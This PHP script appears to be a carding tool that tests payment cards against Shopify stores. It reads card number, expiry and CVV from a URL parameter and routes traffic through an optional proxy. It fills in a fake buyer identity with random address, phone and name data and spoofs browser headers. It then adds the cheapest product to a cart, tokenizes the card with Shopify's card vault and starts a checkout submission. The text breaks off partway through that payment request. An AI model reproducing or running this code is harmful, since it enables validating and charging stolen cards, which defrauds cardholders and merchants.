<?php
error_reporting(E_ALL & ~E_DEPRECATED);

$maxRetries = 5;
$retryCount = 0;
$start_time = microtime(true);

require_once 'ho.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

require_once 'add.php';
$num_us = $randomAddress['numd'];
$address_us = $randomAddress['address1'];
$address = $num_us.' '.$address_us;
$city_us = $randomAddress['city'];
$state_us = $randomAddress['state'];
$zip_us = $randomAddress['zip'];

require_once 'no.php';
$areaCode = $areaCodes[array_rand($areaCodes)];
$phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));

// Important functions start
function find_between($content, $start, $end) {
  $startPos = strpos($content, $start);
  if ($startPos === false) {
    return '';
}
$startPos += strlen($start);
$endPos = strpos($content, $end, $startPos);
if ($endPos === false) { 
    return'';
}
return substr($content, $startPos, $endPos - $startPos);
}

function extractOperationQueryFromFile(string $filePath, string $operationName): ?string {
    $content = @file_get_contents($filePath);
    if ($content === false) {
        return null;
    }
    $needles = [
        'Proposal' => "=> 'query Proposal(",
        'SubmitForCompletion' => "=> 'mutation SubmitForCompletion(",
        'PollForReceipt' => "=> 'query PollForReceipt(",
    ];
    if (!isset($needles[$operationName])) {
        return null;
    }
    $needle = $needles[$operationName];
    $pos = strpos($content, $needle);
    if ($pos === false) {
        return null;
    }
    $start = $pos + strlen("=> '");
    $end = strpos($content, "',", $start);
    if ($end === false) {
        $end = strrpos($content, "'");
        if ($end === false || $end <= $start) {
            return null;
        }
    }
    return substr($content, $start, $end - $start);
}

function test_proxy(string $ip, string $port, string $username = '', string $password = ''): bool {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json"); // A lightweight URL to test connectivity
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_PROXY, $ip . ':' . $port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    if (!empty($username) && !empty($password)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username . ':' . $password);
    }
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); // Timeout after 5 seconds
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Max execution time for cURL
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Proxy is considered live if we get a 200 OK response from the test URL
    return ($httpCode == 200);
}

function add_proxy_details_to_result(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port): string {
    $proxy_status = ($proxy_used ? 'Live' : 'Dead');
    $result_data['ProxyStatus'] = $proxy_status;
    $result_data['ProxyIP'] = ($proxy_used ? $proxy_ip : 'N/A');
    return json_encode($result_data);
}

function send_final_response(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port) {
    $final_result = add_proxy_details_to_result($result_data, $proxy_used, $proxy_ip, $proxy_port);
    echo $final_result;
    exit;
}

$proxy_ip = '';
$proxy_port = '';
$proxy_user = '';
$proxy_pass = '';
$proxy_status = 'N/A'; // Default status
$proxy_used = false;

if (isset($_GET['proxy']) && !empty($_GET['proxy'])) {
    $proxy_parts = explode(':', $_GET['proxy']);
    if (count($proxy_parts) >= 2) {
        $proxy_ip = $proxy_parts[0];
        $proxy_port = $proxy_parts[1];
        if (count($proxy_parts) >= 4) {
            $proxy_user = $proxy_parts[2];
            $proxy_pass = $proxy_parts[3];
        }

        // Test the proxy
        if (test_proxy($proxy_ip, $proxy_port, $proxy_user, $proxy_pass)) {
            $proxy_status = 'Live';
            $proxy_used = true;
        } else {
            $proxy_status = 'Dead';
            $proxy_used = false; // Do not use dead proxy
        }
    } else {
        $proxy_status = 'Invalid Format';
    }
}


$cc1 = $_GET['cc'];
$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];
/*=====  sub_month  ======*/
$yearcont=strlen($year);
if ($yearcont<=2){
$year = "20$year";
}
if($month == "01"){
$sub_month = "1";
}elseif($month == "02"){
$sub_month = "2";
}elseif($month == "03"){
$sub_month = "3";
}elseif($month == "04"){
$sub_month = "4";
}elseif($month == "05"){
$sub_month = "5";
}elseif($month == "06"){
$sub_month = "6";
}elseif($month == "07"){
$sub_month = "7";
}elseif($month == "08"){
$sub_month = "8";
}elseif($month == "09"){
$sub_month = "9";
}elseif($month == "10"){
$sub_month = "10";
}elseif($month == "11"){
$sub_month = "11";
}elseif($month == "12"){
$sub_month = "12";
}

$geoaddress = urlencode("$num_us, $address_us, $city_us");
// echo "<li>geoaddress: $geoaddress<li>";

$ch = curl_init();
if ($proxy_used) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    if (!empty($proxy_user) && !empty($proxy_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$geocoding = curl_exec($ch);

$geocoding_data = json_decode($geocoding, true);

$lat = (float) $geocoding_data[0]['lat'];
$lon = (float) $geocoding_data[0]['lon'];

// echo "<li>lat: $lat<li>";
// echo "<li>lon: $lon<li>";

$ch = curl_init();
if ($proxy_used) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    if (!empty($proxy_user) && !empty($proxy_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resposta = curl_exec($ch);

$firstname = find_between($resposta, '"first":"', '"');
$lastname = find_between($resposta, '"last":"', '"');
// Remove or comment out the lines that generate a random email
// $email = find_between($resposta, '"email":"', '"');
// $serve_arr = array("gmail.com","yahoo.com","hotmail.com","outlook.com");
// $serv_rnd = $serve_arr[array_rand($serve_arr)];
// $email = str_replace("example.com", $serv_rnd, $email);

// Set your own email directly
$email = "legendxkeygrid@gmail.com"; // Replace with your actual email

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products']) || !is_array($data['products'])) {
        throw new Exception('Invalid JSON format or missing/invalid products key');
    }

    // Initialize minPrice as null to find the minimum valid price (above 0.01)
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        // Check if 'variants' key exists and is an array
        if (!isset($product['variants']) || !is_array($product['variants'])) {
            continue; // Skip this product if variants are missing or not an array
        }
        foreach ($product['variants'] as $variant) {
            // Check if 'price' key exists
            if (!isset($variant['price'])) {
                continue; // Skip this variant if price is missing
            }
            $price = (float) $variant['price'];
            // Skip prices below 0.01 (including 0.00)
            if ($price >= 0.01) {
                // If minPrice is null or the current price is lower than minPrice, update minPriceDetails
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'] ?? null, // Use null coalescing operator for safer access
                        'price' => $variant['price'] ?? null,
                        'title' => $product['title'] ?? null,
                    ];
                }
            }
        }
    }

    // If no valid price was found, return an error message or keep minPriceDetails as null.
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    $err = 'Invalid URL';
    $result_data = [
        'Response' => $err,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}

    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
    $site = "$site2/products.json";
    $ch = curl_init();
    if ($proxy_used) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        if (!empty($proxy_user) && !empty($proxy_pass)) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
        }
    }
    curl_setopt($ch, CURLOPT_URL, $site);

    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Accept: application/json',
    ]);

    $r1 = curl_exec($ch);
    if ($r1 === false) {
        $err = 'Error in 1 req: ' . curl_error($ch);
        $result_data = [
            'Response' => $err,
        ];
        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        curl_close($ch);
        exit;
    } else {
        curl_close($ch);
        
        try {
            $productDetails = getMinimumPriceProductDetails($r1);
            $minPriceProductId = $productDetails['id'];
            $minPrice = $productDetails['price'];
            $productTitle = $productDetails['title'];
        } catch (Exception $e) {
            $err = $e->getMessage();
            $result_data = [
                'Response' => $err,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    }

if (empty($minPriceProductId)) {
    $err = 'Product id is empty';
    $result_data = [
        'Response' => $err,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
    exit;
}

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie.txt';
$prodid = $minPriceProductId;
cart:
$ch = curl_init();
if ($proxy_used) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    if (!empty($proxy_user) && !empty($proxy_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
    }
}
curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$ua,
]);

$headers = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
    $name = trim($name);
    $value = trim($value);

    // Save the 'Location' header
    if (strtolower($name) === 'location') {
        $headers['Location'] = $value;
    }

    return strlen($headerLine);
});

$response = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch); // Always close the previous handle before retrying
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
        $err = 'Error in 1st Req => ' . curl_error($ch);
        $result_data = [
            'Response' => $err,
            'Price' => $minPrice,
        ];
        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
    }
} else {
    file_put_contents('php.php', $response );
    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    $web_build_id = find_between($response, 'web_build_id&quot;:&quot;', '&quot;');
    if (empty($web_build_id)) {
        // Fallback to old hardcoded value if dynamic extraction fails
        $web_build_id = 'db0237b7310293c9fb41cbfd6a9f8683dfa53fe0'; 
    }
    $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');

    if (empty($web_build_id) || empty($x_checkout_one_session_token)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            curl_close($ch); // Close current curl handle before retrying
            goto cart; // Retry the entire operation
        } else {
            $err = "Cloudflare Bypass Failed or Session token is empty";
            $result_data = [
                'Response' => $err,
                'Price'=> $minPrice,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    }
}

$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
if (empty($queue_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    $err = 'Queue Token is Empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}

$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
if (empty($stable_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    $err = 'Stable id is empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}
$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart; // Retry the entire operation
    } else {
    $err = 'Payment Method Identifier is empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}
$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}

card:
$ch = curl_init();
if ($proxy_used) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    if (!empty($proxy_user) && !empty($proxy_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://checkout.shopifycs.com',
    'priority: u=1, i',
    'referer: https://checkout.shopifycs.com/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"'.$firstname.' '.$lastname.'"},"payment_session_scope":"'.$domain.'"}');
$response2 = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card; // Retry the entire operation
    } else {
    $err = 'cURL error: ' . curl_error($ch);
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}
$response2js = json_decode($response2, true);
$cctoken = $response2js['id'];
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card; // Retry the entire operation
    } else {
    $err  = 'Card Token is empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
     echo $response2;
    exit;
}
}

proposal:
sleep(2);
$ch = curl_init();
if ($proxy_used) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    if (!empty($proxy_user) && !empty($proxy_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
    }
}
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-GB',
    'content-type: application/json',
    'origin: ' . $urlbase,
    'priority: u=1, i',
    'referer: ' . $urlbase . '/',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'shopify-checkout-client: checkout-web/1.0',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-build-id: ' . $web_build_id,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);
$proposalQuery = extractOperationQueryFromFile('jsonp.php', 'Proposal');
$proposalPayload = [
        'query' => $proposalQuery,
        'variables' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'destination' => [
                            'partialStreetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => $phone,
                                    'oneTimeUse' => false,
                                    'coordinates' => [
                                        'latitude' => $lat,
                                        'longitude' => $lon
                                ]
                            ]
                        ],
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyMatchingConditions' => [
                                'estimatedTimeInTransit' => [
                                    'any' => true
                                ],
                                'shipments' => [
                                    'any' => true
                                ]
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'any' => true
                        ],
                        'deliveryMethodTypes' => [
                            'SHIPPING',
                            'LOCAL'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [
                                    [
                                        'name' => '_minimum_allowed',
                                        'value' => [
                                            'string' => ''
                                        ]
                                    ]
                                ],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
                                'amount' => $minPrice,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address,
                        'address2' => '',
                        'city' => $city_us,
                        'countryCode' => 'US',
                        'postalCode' => $zip_us,
                        'firstName' => $firstname,
                        'lastName' => $lastname,
                        'zoneCode' => $state_us,
                        'phone' => $phone,
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => 'USD',
                    'countryCode' => 'US'
                ],
                'email' => $email,
                'emailChanged' => false,
                'phoneCountryCode' => 'US',
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => 'US'
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => null,
                'proposedTotalIncludedAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => 'USD'
                    ]
                ],
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
];
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($proposalPayload));

$response3 = curl_exec($ch);
// echo "<li>step_3: $response3<li>";
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal; // Retry the entire operation
    } else {
    $err = 'cURL error: ' . curl_error($ch);
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}


$decoded = json_decode($response3);

$gateway = '';
$paymentMethodName = 'null'; // Valor predeterminado en caso de que no haya nombre de método de pago

if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
    $firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;
    
    if (empty($firstStrategy)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal; // Retry the entire operation
        } else {
            $err = 'Shipping info is empty';
            $result_data = [
                'Response' => $err,
                'Price' => $minPrice,
                'Gateway' => $gateway,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    } else {
        // Si `availablePaymentLines` existe y tiene elementos, busca el nombre del método de pago
        if (!empty($firstStrategy->payment->availablePaymentLines)) {
            foreach ($firstStrategy->payment->availablePaymentLines as $paymentLine) {
                if (isset($paymentLine->paymentMethod->name)) {
                    $paymentMethodName = $paymentLine->paymentMethod->name;
                    break; // Sal del bucle una vez que encuentres el primer nombre de método de pago
                }
            }
        }
    }
}

// Asignar el nombre del método de pago al resultado final
$gateway = $paymentMethodName;

if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
    $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
    } 
    if (empty($handle)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            $err = 'Handle is empty';
            $result_data = [
                'Response' => $err,
                'Price'=> $minPrice,
                'Gateway' => $gateway,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    }
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
        $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
    }
    if (empty($delamount)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            $err = 'Delivery rates are empty';
            $result_data = [
                'Response' => $err,
                'Price'=> $minPrice,
                'Gateway' => $gateway,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    }
    if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
        $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
    }
    elseif (empty($tax)) {
        if ($retryCount < $maxRetries) {
                $retryCount++;
                goto proposal;
        }
        $err = 'Tax amount is empty';
        $result_data = [
            'Response' => $err,
            'Price'=> $minPrice,
            'Gateway' => $gateway,
        ];
        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        exit;
    }
    $currencycode = $firstStrategy->tax->totalTaxAmount->value->currencyCode;
    $totalamt = $firstStrategy->runningTotal->value->amount;
  //  $resultg = json_encode([
  //  'Response' => 'Success',
    //'Details' => [
    //    'Price' => $minPrice,
    //    'Shipping' => $delamount,
    //    'Tax' => $tax,
    //    'Total' => $totalamt,
     //   'Currency' => $currencycode,
      //  'Gateway' => $gateway,
 //   ],
//]);
//    echo $resultg;
if ($totalamt == '10.98' && $currencycode == 'USD') {
    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
                'variables' => [
                    'input' => [
                        'sessionInput' => [
                            'sessionToken' => $x_checkout_one_session_token
                        ],
                        'queueToken' => $queue_token,
                        'discounts' => [
                            'lines' => [],
                            'acceptUnexpectedDiscounts' => true
                        ],
                        'delivery' => [
                            'deliveryLines' => [
                                [
                                    'selectedDeliveryStrategy' => [
                                        'deliveryStrategyMatchingConditions' => [
                                            'estimatedTimeInTransit' => [
                                                'any' => true
                                            ],
                                            'shipments' => [
                                                'any' => true
                                            ]
                                        ],
                                        'options' => new stdClass()
                                    ],
                                    'targetMerchandiseLines' => [
                                        'lines' => [
                                            [
                                                'stableId' => $stable_id
                                            ]
                                        ]
                                    ],
                                    'deliveryMethodTypes' => [
                                        'NONE'
                                    ],
                                    'expectedTotalPrice' => [
                                        'any' => true
                                    ],
                                    'destinationChanged' => true
                                ]
                            ],
                            'noDeliveryRequired' => [],
                            'useProgressiveRates' => false,
                            'prefetchShippingRatesStrategy' => null,
                            'supportsSplitShipping' => true
                        ],
                        'deliveryExpectations' => [
                            'deliveryExpectationLines' => []
                        ],
                        'merchandise' => [
                            'merchandiseLines' => [
                                [
                                    'stableId' => $stable_id,
                                    'merchandise' => [
                                        'productVariantReference' => [
                                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                            'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                            'properties' => [],
                                            'sellingPlanId' => null,
                                            'sellingPlanDigest' => null
                                        ]
                                    ],
                                    'quantity' => [
                                        'items' => [
                                            'value' => 1
                                        ]
                                    ],
                                    'expectedTotalPrice' => [
                                        'value' => [
                                            'amount' => $minPrice,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'lineComponentsSource' => null,
                                    'lineComponents' => []
                                ]
                            ]
                        ],
                        'payment' => [
                            'totalAmount' => [
                                'any' => true
                            ],
                            'paymentLines' => [
                                [
                                    'paymentMethod' => [
                                        'directPaymentMethod' => [
                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                            'sessionId' => $cctoken,
                                            'billingAddress' => [
                                                'streetAddress' => [
                                                    'address1' => $address,
                                                    'address2' => '',
                                                    'city' => $city_us,
                                                    'countryCode' => 'US',
                                                    'postalCode' => $zip_us,
                                                    'firstName' => $firstname,
                                                    'lastName' => $lastname,
                                                    'zoneCode' => $state_us,
                                                    'phone' => ''
                                                ]
                                            ],
                                            'cardSource' => null
                                        ],
                                        'giftCardPaymentMethod' => null,
                                        'redeemablePaymentMethod' => null,
                                        'walletPaymentMethod' => null,
                                        'walletsPlatformPaymentMethod' => null,
                                        'localPaymentMethod' => null,
                                        'paymentOnDeliveryMethod' => null,
                                        'paymentOnDeliveryMethod2' => null,
                                        'manualPaymentMethod' => null,
                                        'customPaymentMethod' => null,
                                        'offsitePaymentMethod' => null,
                                        'customOnsitePaymentMethod' => null,
                                        'deferredPaymentMethod' => null,
                                        'customerCreditCardPaymentMethod' => null,
                                        'paypalBillingAgreementPaymentMethod' => null
                                    ],
                                    'amount' => [
                                        'value' => [
                                            'amount' => $totalamt,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'dueAt' => null
                                ]
                            ],
                            'billingAddress' => [
                                'streetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => ''
                                ]
                            ]
                        ],
                        'buyerIdentity' => [
                            'customer' => [
                                'presentmentCurrency' => 'US',
                                'countryCode' => 'US'
                            ],
                            'email' => $email,
                            'emailChanged' => false,
                            'phoneCountryCode' => 'US',
                            'marketingConsent' => [],
                            'shopPayOptInPhone' => [
                                'countryCode' => 'US'
                            ],
                            'rememberMe' => false
